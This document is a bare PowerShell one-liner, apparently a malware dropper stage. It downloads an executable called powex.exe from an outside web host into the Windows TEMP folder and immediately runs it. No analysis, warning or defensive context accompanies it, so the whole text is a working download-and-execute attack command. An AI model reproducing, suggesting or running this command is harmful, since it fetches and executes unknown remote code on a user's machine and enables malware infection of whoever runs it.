
(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/power/powex.exe',"$env:TEMP\powex.exe");Start-Process ("$env:TEMP\powex.exe")

